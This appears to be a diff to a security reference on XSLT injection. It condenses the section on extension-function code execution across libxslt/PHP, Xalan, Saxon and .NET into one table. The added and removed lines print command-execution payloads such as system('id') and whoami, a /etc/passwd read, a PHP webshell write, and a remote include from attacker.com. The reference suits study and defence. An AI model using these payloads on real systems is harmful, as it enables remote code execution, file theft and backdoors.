@@ -281,65 +281,16 @@ The `document()` function is a standard XSLT 1.0 function that retrieves and par
 
 ### §3-3. Extension Function-Based Code Execution
 
-XSLT processors expose language-native function invocation through extension namespaces. This is the primary RCE vector for XSLT injection.
+XSLT processors expose language-native function invocation through extension namespaces — the primary RCE vector for XSLT injection. The specific mechanism depends on the processor:
 
-#### §3-3a. PHP Extension Functions (libxslt / XSLTProcessor)
+| Processor | Platform | Extension Mechanism | RCE Example | Key Condition |
+|-----------|----------|-------------------|-------------|---------------|
+| **libxslt** | PHP / Python / C | `php:function()` calls any registered PHP function | `<xsl:value-of select="php:function('system','id')"/>` (xmlns:php="http://php.net/xsl") | `registerPHPFunctions()` called without allowlist |
+| **Xalan** | Java | Namespace URI maps directly to Java class: `http://xml.apache.org/xalan/java/{class}` | `rt:exec(rt:getRuntime(),'id')` (xmlns:rt=".../java.lang.Runtime") | Extensions enabled (default) |
+| **Saxon PE/EE** | Java / .NET | Reflexive extensions map XPath calls to Java methods | `Runtime:exec(Runtime:getRuntime(),'whoami')` (xmlns:Runtime="java:java.lang.Runtime") | Saxon-PE or Saxon-EE (not HE); `xsl:evaluate` available in XSLT 3.0 mode on all editions |
+| **MSXML / System.Xml** | .NET | `msxsl:script` embeds arbitrary C#/VB.NET/JScript code | `<msxsl:script language="C#">Process.Start("cmd","/c whoami")</msxsl:script>` | `XsltSettings.TrustedXslt` or `XsltSettings(true, true)` — default disables scripting |
 
-When PHP's `XSLTProcessor` class has `registerPHPFunctions()` called, any PHP function becomes callable from XSLT.
-
-| Subtype | Mechanism | Example |
-|---------|-----------|---------|
-| **Direct command execution** | Calls `system()`, `exec()`, `passthru()`, or `shell_exec()` through `php:function()` | `<xsl:value-of select="php:function('system','id')"/>` with `xmlns:php="http://php.net/xsl"` |
-| **File read** | Calls `readfile()` or `file_get_contents()` | `<xsl:value-of select="php:function('readfile','/etc/passwd')"/>` |
-| **File write / webshell** | Calls `file_put_contents()` to write a PHP webshell to the web root | `<xsl:value-of select="php:function('file_put_contents','/var/www/shell.php','<?php system($_GET[\"c\"]); ?>')"/>` |
-| **Directory enumeration** | Uses `scandir()` to list directory contents | `<xsl:value-of select="php:function('scandir','.')"/>` |
-| **Remote file inclusion** | Uses `assert()` + `include()` to load remote PHP code | `<xsl:variable name="p">include("http://attacker.com/shell.php")</xsl:variable><xsl:variable name="r" select="php:function('assert',$p)"/>` |
-| **eval() execution** | Passes arbitrary PHP code to `assert()` or `eval()` via variable indirection | Variable assignment + `php:function('assert', $variable)` |
-
-**Key condition:** `registerPHPFunctions()` must be called without arguments (registers all functions) or with a list that includes dangerous functions. Many frameworks register PHP functions for XSLT templates by default for convenience.
-
-#### §3-3b. Java Extension Functions (Xalan)
-
-Xalan allows binding Java classes to XSLT namespaces, enabling full Java reflection-based code execution.
-
-| Subtype | Mechanism | Example |
-|---------|-----------|---------|
-| **Runtime.exec() — basic** | Binds `java.lang.Runtime` to a namespace and calls `exec()` | `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` → `rt:exec(rt:getRuntime(),'id')` |
-| **Runtime.exec() — with output capture** | Chains `Runtime.exec()` → `Process.getInputStream()` → `InputStreamReader` → `BufferedReader.readLine()` | Full Java IO chain through XSLT variable assignments |
-| **ProcessBuilder** | Uses `java.lang.ProcessBuilder` for more complex command construction with arguments | Construct `ProcessBuilder` instance, call `start()`, read output |
-| **Arbitrary class instantiation** | Creates instances of any accessible Java class | `xmlns:custom="http://xml.apache.org/xalan/java/com.target.ClassName"` → invoke methods |
-| **JNDI lookup** | Triggers JNDI injection via `javax.naming.InitialContext.lookup()` | Bind `InitialContext` class, call `lookup()` with attacker-controlled URL |
-| **Thread-based execution** | Creates new threads for background or delayed execution | Instantiate `Thread` with a `Runnable` implementation |
-
-**Key namespace pattern:** `http://xml.apache.org/xalan/java/{fully.qualified.ClassName}` — the namespace URI directly maps to the Java class.
-
-#### §3-3c. Java Extension Functions (Saxon)
-
-Saxon provides reflexive extension functions that map XPath function calls to Java method invocations.
-
-| Subtype | Mechanism | Example |
-|---------|-----------|---------|
-| **Reflexive Runtime.exec()** | Uses Saxon's reflexive extension mechanism to invoke Java methods | `xmlns:Runtime="java:java.lang.Runtime"` → `Runtime:exec(Runtime:getRuntime(),'cmd.exe /C whoami')` |
-| **saxon:evaluate()** (legacy) | Dynamic XPath evaluation from string (pre-Saxon 12) | `saxon:evaluate($user_input)` — arbitrary XPath from attacker input |
-| **xsl:evaluate (XSLT 3.0)** | Standard XSLT 3.0 instruction for dynamic XPath evaluation | `<xsl:evaluate xpath="$attacker_controlled_xpath"/>` — enables injection within a "safe" stylesheet |
-| **Integrated extension functions** | Uses Saxon-specific extensions for file I/O and system access | Various `saxon:*` extension functions |
-
-**Edition restrictions:** Reflexive extension functions are available in Saxon-PE (Professional Edition) and Saxon-EE (Enterprise Edition). Saxon-HE (Home Edition) does **not** support reflexive extensions by default, but does support `xsl:evaluate` in XSLT 3.0 mode — which is itself a powerful injection vector if the XPath expression contains attacker-controlled data.
-
-#### §3-3d. .NET Script Blocks (MSXML / System.Xml)
-
-The `msxsl:script` element allows embedding arbitrary C#, VB.NET, or JScript code within an XSLT stylesheet.
-
-| Subtype | Mechanism | Example |
-|---------|-----------|---------|
-| **C# Process.Start()** | Embeds C# code that spawns a new process | `<msxsl:script language="C#" implements-prefix="App"><![CDATA[public string Run(){ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); return ""; }]]></msxsl:script>` |
-| **C# with output capture** | Redirects process stdout for command output retrieval | Full `Process` configuration with `RedirectStandardOutput = true`, `UseShellExecute = false` |
-| **File system operations** | Uses `System.IO` classes for file read/write | `System.IO.File.ReadAllText(@"C:\secret.txt")` within `msxsl:script` |
-| **Network operations** | Uses `System.Net` classes for HTTP requests, DNS lookups, or socket operations | `WebClient.DownloadString()` or `TcpClient` within script block |
-| **Assembly loading** | Loads arbitrary .NET assemblies for extended functionality | `Assembly.Load()` within script block |
-| **VB.NET / JScript variants** | Same capabilities using different .NET languages | `language="VB"` or `language="JScript"` attribute |
-
-**Key condition:** The .NET `XslCompiledTransform` class must have scripting enabled via `XsltSettings.TrustedXslt` or `XsltSettings(true, true)`. The default `XsltSettings.Default` disables script execution. However, many legacy applications and frameworks explicitly enable scripting for template flexibility.
+All processors also support `document()` for file read/SSRF (§3-2) and may allow JNDI lookups (Xalan), file write via EXSLT `exsl:document` (libxslt), or dynamic XPath evaluation via `xsl:evaluate`/`saxon:evaluate` (Saxon).
 
 ### §3-4. File Write via EXSLT Extensions
 
